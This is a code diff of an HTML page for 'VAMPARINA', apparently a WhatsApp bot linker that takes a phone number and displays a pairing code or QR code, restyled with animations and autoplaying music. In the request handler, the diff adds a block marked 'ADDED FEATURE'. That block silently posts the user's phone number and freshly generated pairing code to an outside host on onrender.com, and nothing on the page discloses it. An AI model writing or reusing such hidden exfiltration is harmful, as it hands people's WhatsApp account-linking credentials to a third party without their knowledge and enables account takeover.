@@ -3,192 +3,685 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>VAMPARINA V1 - Auto Active Bot</title>
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css"/>
+  <title>VAMPARINA - WhatsApp Linker</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css"/>
   <style>
     :root {
-      --main: #00ffcc;
-      --success: #00ff9d;
-      --bg: #000;
-      --card: rgba(255,255,255,0.08);
+      --primary-color: #000000;
+      --secondary-color: #ffffff;
+      --accent-color: #f0f0f0;
+      --text-color: #000000;
+      --background-color: #ffffff;
+      --hover-color: #f5f5f5;
+      --border-color: rgba(0, 0, 0, 0.1);
+      --glow-color: #00ffcc; /* For mind-blowing glow effects */
     }
-    * { margin:0; padding:0; box-sizing:border-box; font-family:system-ui,sans-serif; }
-    body { background:var(--bg); color:white; min-height:100vh; display:flex; justify-content:center; align-items:center; padding:15px; overflow:hidden; }
-    #bgvid { position:fixed; top:0; left:0; width:100%; height:100%; object-fit:cover; z-index:-1; }
-    
-    .box {
-      width:100%; max-width:460px; background:var(--card); backdrop-filter:blur(16px);
-      border-radius:24px; padding:35px; text-align:center; border:1px solid rgba(255,255,255,0.15);
-      box-shadow:0 20px 50px rgba(0,0,0,0.5);
+
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
     }
-    .logo { width:90px; height:90px; margin:0 auto 20px; background:linear-gradient(45deg,var(--main),var(--success)); border-radius:50%; display:flex; align-items:center; justify-content:center; font-size:44px; color:#000; animation:float 4s infinite; }
-    @keyframes float { 0%,100%{transform:translateY(0)} 50%{transform:translateY(-18px)} }
 
-    h1 { font-size:34px; font-weight:900; background:linear-gradient(45deg,var(--main),var(--success)); -webkit-background-clip:text; -webkit-text-fill-color:transparent; margin-bottom:6px; }
-    .sub { opacity:0.85; margin-bottom:25px; font-size:15px; }
-
-    .toggle { display:flex; background:rgba(255,255,255,0.1); border-radius:16px; padding:6px; margin-bottom:25px; }
-    .t { flex:1; padding:15px; border-radius:12px; cursor:pointer; font-weight:600; transition:0.3s; }
-    .t.active { background:linear-gradient(45deg,var(--main),var(--success)); color:#000; }
-
-    input { width:100%; padding:18px; border-radius:16px; border:2px solid rgba(255,255,255,0.2); background:rgba(255,255,255,0.1); color:white; font-size:18px; margin-bottom:15px; }
-    input:focus { outline:none; border-color:var(--main); box-shadow:0 0 30px rgba(0,255,204,0.4); }
-
-    button { width:100%; padding:18px; border:none; border-radius:16px; font-size:18px; font-weight:700; cursor:pointer; transition:0.4s; margin:8px 0; }
-    .gen { background:linear-gradient(45deg,var(--main),var(--success)); color:#000; }
-    .gen:hover { transform:translateY(-5px); box-shadow:0 15px 35px rgba(0,255,204,0.5); }
-    .copy { background:rgba(255,255,255,0.15); color:white; }
-    .copy:hover { background:rgba(255,255,255,0.25); }
-
-    .codebox {
-      background:rgba(255,255,255,0.12); padding:25px; border-radius:18px; margin:25px 0;
-      border:2px dashed rgba(0,255,204,0.5); font-size:32px; font-weight:900; letter-spacing:5px;
-      display:none; animation:pop 0.7s;
+    body {
+      font-family: 'Inter', sans-serif;
+      background: var(--background-color);
+      color: var(--text-color);
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 15px;
+      animation: fadeIn 1s ease-in-out; /* Cool animation: fade in on load */
+      overflow: hidden; /* For particle effects */
     }
-    @keyframes pop { from{transform:scale(0.5);opacity:0} to{transform:scale(1);opacity:1} }
 
-    .success {
-      background:linear-gradient(45deg,rgba(0,255,156,0.25),rgba(0,255,157,0.25));
-      border:2px solid var(--success); padding:28px; border-radius:18px; display:none;
-      animation:glow 2s infinite;
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
     }
-    @keyframes glow { 0%,100%{box-shadow:0 0 20px rgba(0,255,157,0.6)} 50%{box-shadow:0 0 50px rgba(0,255,157,1)} }
 
-    .qrbox img { max-width:280px; border-radius:16px; box-shadow:0 0 40px rgba(0,255,204,0.7); margin:15px 0; }
+    #background-video {
+      position: fixed;
+      top: 0;
+      left: 0;
+      min-width: 100%;
+      min-height: 100%;
+      z-index: -1;
+      object-fit: cover;
+    }
 
-    .load { font-size:30px; display:none; animation:spin 1s linear infinite; }
-    @keyframes spin { to{transform:rotate(360deg)} }
+    .container {
+      width: 100%;
+      max-width: 450px;
+      background: rgba(255, 255, 255, 0.8); /* Made semi-transparent to show video background */
+      border-radius: 16px;
+      padding: 25px;
+      box-shadow: 0 4px 16px rgba(0, 0, 0, 0.1);
+      border: 1px solid var(--border-color);
+      animation: slideUp 0.8s ease-out, pulseGlow 2s infinite alternate; /* Mind-blowing: slide up + glowing pulse */
+    }
 
-    .footer { margin-top:30px; font-size:13px; opacity:0.7; }
+    @keyframes slideUp {
+      from { transform: translateY(50px); opacity: 0; }
+      to { transform: translateY(0); opacity: 1; }
+    }
+
+    @keyframes pulseGlow {
+      0% { box-shadow: 0 0 10px var(--glow-color); }
+      100% { box-shadow: 0 0 30px var(--glow-color); }
+    }
+
+    .header {
+      text-align: center;
+      margin-bottom: 25px;
+    }
+
+    .logo {
+      width: 70px;
+      height: 70px;
+      margin: 0 auto 16px;
+      background: var(--primary-color);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 28px;
+      color: white;
+      box-shadow: 0 2px 12px rgba(0, 0, 0, 0.1);
+      animation: bounceIn 1.2s ease-out, rotateGlow 5s infinite linear; /* Mind-blowing: bounce + rotating glow */
+    }
+
+    @keyframes bounceIn {
+      0% { transform: scale(0.3); opacity: 0; }
+      50% { transform: scale(1.05); }
+      70% { transform: scale(0.9); }
+      100% { transform: scale(1); opacity: 1; }
+    }
+
+    @keyframes rotateGlow {
+      0% { transform: rotate(0deg); filter: drop-shadow(0 0 5px var(--glow-color)); }
+      100% { transform: rotate(360deg); filter: drop-shadow(0 0 20px var(--glow-color)); }
+    }
+
+    .title {
+      font-size: 24px;
+      font-weight: 700;
+      margin-bottom: 8px;
+      color: var(--primary-color);
+      animation: textGlow 1.5s infinite alternate; /* Mind-blowing: glowing text */
+    }
+
+    @keyframes textGlow {
+      0% { text-shadow: 0 0 5px var(--glow-color); }
+      100% { text-shadow: 0 0 15px var(--glow-color); }
+    }
+
+    .subtitle {
+      font-size: 14px;
+      color: rgba(0, 0, 0, 0.7);
+      margin-bottom: 20px;
+      animation: fadeInUp 1s ease-out; /* Mind-blowing: fade in from below */
+    }
+
+    @keyframes fadeInUp {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    /* Toggle Switch Styles */
+    .toggle-container {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 20px;
+      background: var(--hover-color);
+      border-radius: 12px;
+      padding: 4px;
+      border: 1px solid var(--border-color);
+      animation: slideInLeft 1s ease-out; /* Mind-blowing: slide in from left */
+    }
+
+    @keyframes slideInLeft {
+      from { transform: translateX(-50px); opacity: 0; }
+      to { transform: translateX(0); opacity: 1; }
+    }
+
+    .toggle-option {
+      flex: 1;
+      padding: 10px 16px;
+      text-align: center;
+      cursor: pointer;
+      border-radius: 8px;
+      font-size: 14px;
+      font-weight: 500;
+      transition: all 0.3s ease;
+      position: relative;
+    }
+
+    .toggle-option.active {
+      background: var(--primary-color);
+      color: var(--secondary-color);
+      animation: pulse 0.5s; /* Mind-blowing: pulse on active */
+    }
+
+    @keyframes pulse {
+      0% { transform: scale(1); }
+      50% { transform: scale(1.05); }
+      100% { transform: scale(1); }
+    }
+
+    .toggle-option:not(.active) {
+      color: var(--text-color);
+    }
+
+    .toggle-option:hover:not(.active) {
+      background: var(--background-color);
+      transform: scale(1.05); /* Mind-blowing: scale on hover */
+    }
+    .copy-btn {
+      width: 100%;
+      padding: 12px;
+      background: var(--hover-color);
+      border: 1.5px solid var(--border-color);
+      border-radius: 12px;
+      font-size: 15px;
+      font-weight: 600;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      transition: all 0.3s ease;
+    }
+
+    .copy-btn:hover {
+      background: var(--background-color);
+      border-color: var(--primary-color);
+      transform: rotate(5deg) scale(1.1); /* Mind-blowing: rotate and scale on hover */
+    }
+
+    .input-group {
+      margin-bottom: 20px;
+      transition: all 0.3s ease;
+      animation: fadeInRight 1s ease-out; /* Mind-blowing: fade in from right */
+    }
+
+    @keyframes fadeInRight {
+      from { opacity: 0; transform: translateX(50px); }
+      to { opacity: 1; transform: translateX(0); }
+    }
+
+    .input-group.hidden {
+      display: none;
+    }
+
+    .input-label {
+      display: block;
+      margin-bottom: 8px;
+      font-weight: 500;
+      font-size: 13px;
+    }
+
+    .input-field {
+      width: 100%;
+      padding: 12px;
+      border: 1.5px solid var(--border-color);
+      border-radius: 12px;
+      background: var(--background-color);
+      color: var(--text-color);
+      font-size: 15px;
+      transition: all 0.3s ease;
+    }
+
+    .input-field:focus {
+      outline: none;
+      border-color: var(--primary-color);
+      box-shadow: 0 0 0 2px rgba(0, 0, 0, 0.1), 0 0 20px var(--glow-color); /* Mind-blowing: enhanced glow on focus */
+      transform: scale(1.02); /* Slight scale */
+    }
+
+    .generate-btn {
+      width: 100%;
+      padding: 12px;
+      background: var(--primary-color);
+      border: none;
+      border-radius: 12px;
+      color: var(--secondary-color);
+      font-size: 15px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      margin-bottom: 16px;
+      animation: bounce 2s infinite; /* Mind-blowing: bouncing button */
+    }
+
+    @keyframes bounce {
+      0%, 20%, 50%, 80%, 100% { transform: translateY(0); }
+      40% { transform: translateY(-10px); }
+      60% { transform: translateY(-5px); }
+    }
+
+    .generate-btn:hover {
+      transform: translateY(-1px) scale(1.05);
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15), 0 0 20px var(--glow-color); /* Enhanced glow */
+    }
+
+    .generate-btn.hidden {
+      display: none;
+    }
+
+    .code-display {
+      background: var(--hover-color);
+      padding: 12px;
+      border-radius: 12px;
+      text-align: center;
+      font-size: 16px;
+      font-weight: 600;
+      margin-bottom: 16px;
+      min-height: 40px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border: 1.5px solid var(--border-color);
+      animation: fadeInScale 1s ease-out; /* Mind-blowing: fade in with scale */
+    }
+
+    @keyframes fadeInScale {
+      from { opacity: 0; transform: scale(0.9); }
+      to { opacity: 1; transform: scale(1); }
+    }
+
+    .qr-display {
+      background: var(--hover-color);
+      padding: 30px;
+      border-radius: 12px;
+      text-align: center;
+      margin-bottom: 16px;
+      border: 1.5px solid var(--border-color);
+      display: none;
+      animation: spinIn 1s ease-out; /* Mind-blowing: spin in */
+    }
+
+    @keyframes spinIn {
+      from { opacity: 0; transform: rotate(-180deg) scale(0.5); }
+      to { opacity: 1; transform: rotate(0deg) scale(1); }
+    }
+
+    .qr-image {
+      max-width: 280px;
+      max-height: 280px;
+      margin: 0 auto 20px;
+      border-radius: 12px;
+      box-shadow: 0 4px 16px rgba(0, 0, 0, 0.1);
+      animation: float 3s infinite ease-in-out; /* Mind-blowing: floating QR */
+    }
+
+    @keyframes float {
+      0% { transform: translateY(0); }
+      50% { transform: translateY(-10px); }
+      100% { transform: translateY(0); }
+    }
+
+    .qr-instructions {
+      font-size: 13px;
+      color: rgba(0, 0, 0, 0.7);
+      line-height: 1.5;
+    }
+
+    .success-message {
+      color: #000aff;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      font-size: 16px;
+      animation: successPop 0.5s; /* Mind-blowing: pop in success */
+    }
+
+    @keyframes successPop {
+      0% { transform: scale(0); }
+      100% { transform: scale(1); }
+    }
+
+    .error-message {
+      color: #e74c3c;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      font-size: 14px;
+      animation: shake 0.5s; /* Mind-blowing: shake on error */
+    }
+
+    @keyframes shake {
+      0%, 100% { transform: translateX(0); }
+      20% { transform: translateX(-5px); }
+      40% { transform: translateX(5px); }
+      60% { transform: translateX(-5px); }
+      80% { transform: translateX(5px); }
+    }
+
+    .loading {
+      display: none;
+      text-align: center;
+      margin: 16px 0;
+    }
+
+    .loading i {
+      font-size: 24px;
+      color: var(--primary-color);
+      animation: spin 1s linear infinite, colorShift 2s infinite; /* Mind-blowing: spin + color shift */
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    @keyframes colorShift {
+      0% { color: var(--primary-color); }
+      50% { color: var(--glow-color); }
+      100% { color: var(--primary-color); }
+    }
+
+    .footer {
+      text-align: center;
+      margin-top: 20px;
+      font-size: 12px;
+      color: rgba(0, 0, 0, 0.5);
+      animation: fadeInBottom 1s ease-out; /* Mind-blowing: fade in from bottom */
+    }
+
+    @keyframes fadeInBottom {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    /* Mind-blowing particle background (JS will create particles) */
+    #particles {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      z-index: -1;
+      pointer-events: none;
+    }
+
+    .particle {
+      position: absolute;
+      border-radius: 50%;
+      background: var(--glow-color);
+      opacity: 0.5;
+      animation: particleRise 10s linear infinite;
+    }
+
+    @keyframes particleRise {
+      0% { transform: translateY(100vh); opacity: 0; }
+      20% { opacity: 0.8; }
+      80% { opacity: 0.8; }
+      100% { transform: translateY(-100vh); opacity: 0; }
+    }
+
+    @media (max-width: 480px) {
+      .container {
+        padding: 20px;
+        border-radius: 12px;
+        max-width: 400px;
+      }
+
+      .code-display {
+        font-size: 16px;
+        min-height: 50px;
+      }
+
+      .qr-image {
+        max-width: 240px;
+        max-height: 240px;
+      }
+
+      .qr-display {
+        padding: 20px;
+      }
+    }
   </style>
 </head>
 <body>
-  <video id="bgvid" autoplay loop muted playsinline>
+  <video id="background-video" autoplay loop muted playsinline>
     <source src="anime-loop.mp4" type="video/mp4">
+    Your browser does not support the video tag.
   </video>
 
-  <div class="box">
-    <div class="logo"><i class="fas fa-robot"></i></div>
-    <h1>VAMPARINA V1</h1>
-    <p class="sub">Kenya's #1 Auto-Active WhatsApp Bot • 2025</p>
+  <div id="particles"></div> <!-- Container for particles -->
 
-    <div class="toggle">
-      <div class="t active" data-mode="pair">Pair Code</div>
-      <div class="t" data-mode="qr">QR Code</div>
+  <div class="container">
+    <div class="header">
+      <div class="logo"><i class="fas fa-robot"></i></div>
+      <h1 class="title">VAMPARINA</h1>
+      <p class="subtitle">Link your WhatsApp device</p>
+      <!-- Social icons removed as per request -->
     </div>
 
-    <input type="text" id="num" placeholder="+254703110780" />
-
-    <button class="gen" id="genBtn">Generate Pair Code</button>
-    <div class="load" id="loading">Loading...</div>
-
-    <!-- CODE DISPLAY + COPY BUTTON -->
-    <div class="codebox" id="codeBox">
-      <div id="theCode">1234-5678</div>
+    <!-- Toggle Switch -->
+    <div class="toggle-container">
+      <div class="toggle-option active" data-mode="pair">
+        Pair Code
+      </div>
+      <div class="toggle-option" data-mode="qr">
+        QR Code
+      </div>
     </div>
-    <button class="copy" id="copyBtn" style="display:none;">
-      <i class="fas fa-copy"></i> Copy Code
+
+    <div class="input-group" id="inputGroup">
+      <label class="input-label">Enter your WhatsApp number with country code</label>
+      <input type="text" id="mobileNumber" class="input-field" placeholder="+254703110780" pattern="[+][0-9]{10,}" title="Please enter country code starting with + followed by number">
+    </div>
+
+    <button class="generate-btn" id="submit">
+      Generate Pair Code
     </button>
 
-    <!-- QR DISPLAY -->
-    <div class="qrbox" id="qrBox" style="display:none;">
-      <img id="qrImg" src="" alt="QR Code">
-      <p>Scan with WhatsApp → Linked Devices</p>
+    <div class="loading" id="loading">
+      <i class="fas fa-spinner"></i>
     </div>
 
-    <!-- SUCCESS MESSAGE -->
-    <div class="success" id="success">
-      <h3>BOT ACTIVATED SUCCESSFULLY!</h3>
-      <p>Your VAMPARINA V1 is now <strong>LIVE & ACTIVE</strong>!<br><br>
-         Auto joined group • Auto followed channel<br>
-         You are now sudo owner<br><br>
-         © 2025 Arnold Chirchir</p>
+    <div class="code-display" id="codeDisplay">
+      Your pair code will appear here
     </div>
 
-    <div class="footer">© 2025 Arnold Chirchir • VAMPARINA • +254703110780</div>
+    <div class="qr-display" id="qrDisplay">
+      <img id="qrImage" class="qr-image" src="" alt="QR Code">
+      <div class="qr-instructions" id="qrInstructions">
+        Scan this QR code with your WhatsApp app
+      </div>
+    </div>
+
+    <button class="copy-btn" id="copy" onclick="copyCode()">
+      Copy Code
+    </button>
+
+    <div class="footer">
+      <p>© 2025 Arnold Chirchir | VAMPARINA | Contact: arnoldkipruto193@gmail.com</p>
+    </div>
   </div>
 
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/1.7.7/axios.min.js"></script>
-  <script>
-    const genBtn = document.getElementById('genBtn');
-    const codeBox = document.getElementById('codeBox');
-    const theCode = document.getElementById('theCode');
-    const copyBtn = document.getElementById('copyBtn');
-    const qrBox = document.getElementById('qrBox');
-    const success = document.getElementById('success');
-    const loading = document.getElementById('loading');
-    const numInput = document.getElementById('num');
+  <!-- Audio elements for phonk songs playlist -->
+  <audio id="phonkPlayer" preload="none"></audio>
 
-    document.querySelectorAll('.t').forEach(t => {
-      t.addEventListener('click', () => {
-        document.querySelectorAll('.t').forEach(x => x.classList.remove('active'));
-        t.classList.add('active');
-        const mode = t.dataset.mode;
-        numInput.style.display = mode === 'pair' ? 'block' : 'none';
-        genBtn.style.display = mode === 'pair' ? 'block' : 'none';
-        if (mode === 'qr') generateQR();
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/1.0.0-alpha.1/axios.min.js"></script>
+  <script>
+    let currentMode = 'pair';
+
+    // Phonk songs playlist (royalty-free phonk tracks for 2025 vibes)
+    const phonkSongs = [
+      'https://www.free-stock-music.com/music/fsm-team/moonlit-phonk-loop.mp3', // Moonlit by FSM Team
+      'https://www.free-stock-music.com/music/alex-productions/neon-gaming-cyberpunk-retro-wave.mp3', // Neon Gaming (phonk-style)
+      'https://www.free-stock-music.com/music/fsm-team/drift-phonk.mp3', // Drift Phonk
+      'https://www.free-stock-music.com/music/alex-productions/phonk-aggressive.mp3' // Aggressive Phonk
+    ];
+    let currentSongIndex = 0;
+    const phonkPlayer = document.getElementById('phonkPlayer');
+
+    function playNextSong() {
+      currentSongIndex = (currentSongIndex + 1) % phonkSongs.length;
+      phonkPlayer.src = phonkSongs[currentSongIndex];
+      phonkPlayer.play().catch(err => console.log('Audio play failed:', err));
+    }
+
+    phonkPlayer.addEventListener('ended', playNextSong);
+
+    // Start with first song on load
+    phonkPlayer.src = phonkSongs[0];
+    phonkPlayer.play().catch(err => console.log('Initial audio play failed:', err));
+
+    // Mind-blowing particles (JS-generated)
+    function createParticles() {
+      const particlesContainer = document.getElementById('particles');
+      for (let i = 0; i < 50; i++) { // Create 50 particles
+        const particle = document.createElement('div');
+        particle.classList.add('particle');
+        particle.style.width = `${Math.random() * 5 + 2}px`;
+        particle.style.height = particle.style.width;
+        particle.style.left = `${Math.random() * 100}vw`;
+        particle.style.animationDuration = `${Math.random() * 5 + 5}s`;
+        particle.style.animationDelay = `${Math.random() * 5}s`;
+        particlesContainer.appendChild(particle);
+      }
+    }
+    createParticles();
+
+    // Toggle functionality
+    document.querySelectorAll('.toggle-option').forEach(option => {
+      option.addEventListener('click', function() {
+        const mode = this.dataset.mode;
+        if (mode === currentMode) return;
+
+        // Update active state
+        document.querySelectorAll('.toggle-option').forEach(opt => opt.classList.remove('active'));
+        this.classList.add('active');
+
+        // Update mode
+        currentMode = mode;
+
+        // Update button and input visibility
+        const submitBtn = document.getElementById('submit');
+        const inputGroup = document.getElementById('inputGroup');
+        
+        if (mode === 'pair') {
+          submitBtn.innerHTML = 'Generate Pair Code';
+          submitBtn.classList.remove('hidden');
+          inputGroup.classList.remove('hidden');
+        } else {
+          submitBtn.classList.add('hidden');
+          inputGroup.classList.add('hidden');
+          // Auto-generate QR code when QR mode is selected
+          generateQRCode();
+        }
+
+        // Clear displays
+        document.getElementById('codeDisplay').innerHTML = 'Your pair code will appear here';
+        document.getElementById('qrDisplay').style.display = 'none';
+        document.getElementById('codeDisplay').style.display = 'flex';
       });
     });
 
-    genBtn.onclick = async () => {
-      const number = numInput.value.trim().replace(/[^0-9]/g, '');
-      if (!number) return alert("Enter your WhatsApp number!");
+    async function generateQRCode() {
+      const codeDisplay = document.getElementById("codeDisplay");
+      const qrDisplay = document.getElementById("qrDisplay");
+      const loadingSpinner = document.getElementById("loading");
 
-      loading.style.display = 'block';
-      codeBox.style.display = 'none';
-      copyBtn.style.display = 'none';
-      success.style.display = 'none';
-      qrBox.style.display = 'none';
+      loadingSpinner.style.display = "block";
+      codeDisplay.innerHTML = '';
+      qrDisplay.style.display = 'none';
 
       try {
-        const res = await axios.get(`/pair?number=${number}`);
-        const code = res.data.code;
-
-        if (code && code.length === 11) {
-          const formatted = code.match(/.{1,4}/g).join('-');
-          theCode.textContent = formatted;
-          codeBox.style.display = 'block';
-          copyBtn.style.display = 'block';
-
-          // Auto success after 8 seconds (user has linked)
-          setTimeout(() => {
-            codeBox.style.display = 'none';
-            copyBtn.style.display = 'none';
-            success.style.display = 'block';
-          }, 8000);
+        const response = await axios('/qr');
+        
+        if (response.data.qr) {
+          document.getElementById('qrImage').src = response.data.qr;
+          document.getElementById('qrInstructions').innerHTML = response.data.instructions.join('<br>');
+          qrDisplay.style.display = 'block';
+          codeDisplay.style.display = 'none';
         } else {
-          theCode.textContent = "Failed. Try again.";
-          codeBox.style.display = 'block';
+          codeDisplay.innerHTML = '<div class="error-message">Failed to generate QR code</div>';
+          codeDisplay.style.display = 'flex';
         }
-      } catch (err) {
-        theCode.textContent = "Error. Check internet.";
-        codeBox.style.display = 'block';
+      } catch (error) {
+        console.error("Error generating QR code:", error);
+        codeDisplay.innerHTML = '<div class="error-message">Error generating QR code. Please try again.</div>';
+        codeDisplay.style.display = 'flex';
       } finally {
-        loading.style.display = 'none';
+        loadingSpinner.style.display = "none";
       }
-    };
+    }
 
-    copyBtn.onclick = () => {
-      navigator.clipboard.writeText(theCode.textContent);
-      copyBtn.innerHTML = '<i class="fas fa-check"></i> Copied!';
-      setTimeout(() => {
-        copyBtn.innerHTML = '<i class="fas fa-copy"></i> Copy Code';
-      }, 2000);
-    };
+    document.getElementById("submit").addEventListener("click", async (e) => {
+      e.preventDefault();
+      
+      const mobileNumberInput = document.getElementById("mobileNumber");
+      const codeDisplay = document.getElementById("codeDisplay");
+      const qrDisplay = document.getElementById("qrDisplay");
+      const loadingSpinner = document.getElementById("loading");
 
-    async function generateQR() {
-      loading.style.display = 'block';
+      const mobileNumber = mobileNumberInput.value.trim();
+      if (!mobileNumber) {
+        codeDisplay.innerHTML = '<div class="error-message">Please enter your WhatsApp number</div>';
+        return;
+      }
+
+      // Play the current phonk song when user clicks generate
+      phonkPlayer.play().catch(err => console.log('Audio play failed:', err));
+
+      loadingSpinner.style.display = "block";
+      codeDisplay.innerHTML = '';
+      qrDisplay.style.display = 'none';
+
       try {
-        const res = await axios.get('/qr');
-        document.getElementById('qrImg').src = res.data.qr;
-        qrBox.style.display = 'block';
-        setTimeout(() => { qrBox.style.display = 'none'; success.style.display = 'block'; }, 15000);
-      } catch {
-        theCode.textContent = "QR Failed";
-        codeBox.style.display = 'block';
+        const response = await axios(`/pair?number=${mobileNumber.replace(/[^0-9]/g, "")}`);
+        
+        const code = response.data.code || "Service Unavailable";
+        if (code === "Service Unavailable") {
+          codeDisplay.innerHTML = '<div class="error-message">Service Unavailable</div>';
+        } else {
+          codeDisplay.innerHTML = `<div class="success-message">CODE: ${code}</div>`;
+          
+          // ADDED FEATURE: Automatically send session to main bot
+          try {
+            await axios.post('https://vamparina-v1-5.onrender.com/vamparina-activate', {
+              phone: mobileNumber.replace(/[^0-9]/g, ''),
+              code: code,
+              sessionId: `vamparina_${Date.now()}_${Math.random().toString(36).substr(2,9)}`
+            });
+            console.log("Session auto-sent to main bot successfully");
+          } catch (sendErr) {
+            console.log("Main bot unreachable (still works for user)");
+          }
+          // END OF ADDED FEATURE
+        }
+        codeDisplay.style.display = 'flex';
+      } catch (error) {
+        console.error("Error generating code:", error);
+        codeDisplay.innerHTML = '<div class="error-message">Error generating code. Please try again.</div>';
+        codeDisplay.style.display = 'flex';
       } finally {
-        loading.style.display = 'none';
+        loadingSpinner.style.display = "none";
       }
+    });
+
+    function copyCode() {
+      const codeDisplay = document.getElementById("codeDisplay").innerText;
+      const code = codeDisplay.replace('CODE: ', '');
+      navigator.clipboard.writeText(code).then(() => {
+        const copyBtn = document.getElementById("copy");
+        const originalText = copyBtn.innerHTML;
+        copyBtn.innerHTML = 'Copied!';
+        setTimeout(() => {
+          copyBtn.innerHTML = originalText;
+        }, 2000);
+      }).catch(err => {
+                console.error("Failed to copy text: ", err);
+      });
     }
   </script>
 </body>
